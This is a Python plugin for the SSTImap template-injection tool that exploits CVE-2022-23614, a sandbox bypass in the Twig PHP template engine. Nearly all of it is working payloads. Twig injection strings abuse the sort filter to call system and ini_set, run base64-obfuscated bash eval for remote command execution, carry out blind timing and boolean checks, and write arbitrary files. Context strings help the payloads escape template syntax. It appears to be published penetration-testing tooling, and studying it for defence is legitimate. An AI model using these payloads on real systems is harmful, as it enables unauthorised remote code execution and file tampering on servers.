from plugins.languages import php
from core import bash
from utils import rand


class CVE_2022_23614(php.Php):
    extra_plugin = True
    priority = 6
    header_type = 'add'
    sstimap_version = '1.2.3'
    plugin_info = {
        "Description": """Sandbox bypass in Twig >=2.12 <2.14.11 and >=3.0 <3.3.8""",
        "Usage notes": """Exploits CVE-2022-23614, bypassing sandbox in Twig using |sort filter with PHP functions
This plugin also works for Twig of versions >=2.12 and >=3.0 without sandbox, covered by Twig plugin""",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Automatic payload for CVE-2022-23614
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload for older versions of Twig
        ],
        "References": [
            "CVE-2022-23614: https://nvd.nist.gov/vuln/detail/CVE-2022-23614",
        ],
        "Engine": [
            "Homepage: https://twig.symfony.com/",
            "Github: https://github.com/twigphp/Twig",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                # Disable errors, so that "system" will not corrupt the output with a warning
                'header': '{{% set a = ["error_reporting", "0"]|sort("ini_set") %}}{{{{{header[0]}+{header[1]}}}}}',
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}',
                'test_render': f'{{{{(1..3)|sort((x, y) => x < y)|join("")}}}}{{{{"{rand.randstrings[0]}\n"|nl2br}}}}',
                'test_render_expected': f'321{rand.randstrings[0]}<br />'
            },
            'render_error': {
                'render': '{code}',
                # Enable fatal errors, then start buffering with error-triggering callback
                'header': '{{% set a = ["error_reporting", "1"]|sort("ini_set") %}}'
                          '{{% set b = ["ob_start", "call_user_func"]|sort("call_user_func") %}}'
                          '{{{{{header[0]}+{header[1]}}}}}',
                # End buffering to trigger callback leading to the error
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}'
                           '{{% set a = ["ob_end_flush", []]|sort("call_user_func_array") %}}',
                # Anything printing to template or page will work
                'test_render': f'{{{{(1..3)|sort((x, y) => x < y)|join("")}}}}{{{{"{rand.randstrings[0]}\n"|nl2br}}}}',
                'test_render_expected': f'321{rand.randstrings[0]}<br />'
            },
            # Hackish way to evaluate PHP code
            'evaluate': {
                'call': 'execute',
                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
                'test_os': 'echo PHP_OS;',
                'test_os_expected': r'^[\w-]+$'
            },
            # Hackish way to evaluate PHP code
            'evaluate_error': {
                'call': 'execute',
                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
            },
            'evaluate_boolean': {
                'call': 'execute_blind',
                'evaluate_blind': """php -r '$d="{code_b64}";1 / (true && eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ");"));'""",
            },
            'evaluate_blind': {
                'call': 'execute',
                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'"""
            },
            'execute': {
                'call': 'render',
                'execute': """{{% for a in ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'", ""]|sort("system") %}}{{% endfor %}}""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'execute_error': {
                'call': 'render',
                'execute': """{{% set c = ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'", ""]|sort("system") %}}""",
            },
            # Very hackish way to check success
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """{{% set a = ["error_reporting", "1"]|sort("ini_set") %}}{{{{ 1 / (["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}>>/dev/null&&{{echo,-n,1}}'", "0"]|sort("system")|first == "0") }}}}""",
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{{{ ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}'", ""]|sort("system") }}}}"""
            },
            'write': {
                'call': 'inject',
                'write': """{{{{ ["bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}'", ""]|sort("system") }}}}""",
                'truncate': """{{{{ ["echo -n >{path}", ""]|sort("system") }}}}"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '{{1', 'closures': php.ctx_closures},
            {'level': 1, 'prefix': '{closure} %}}', 'suffix': '', 'closures': php.ctx_closures},
            {'level': 2, 'prefix': '#}}', 'suffix': '{#'},
            {'level': 5, 'prefix': '{closure} %}}{{% endfor %}}{{% for a in [1] %}}', 'suffix': '',
             'closures': php.ctx_closures},
            # This escapes string "inter#{"asd"}polation"
            {'level': 5, 'prefix': '{closure}}}', 'suffix': '', 'closures': php.ctx_closures},
            # This escapes string {% set %s = 1 %}
            {'level': 5, 'prefix': '{closure} = 1 %}}', 'suffix': '', 'closures': php.ctx_closures},
        ])
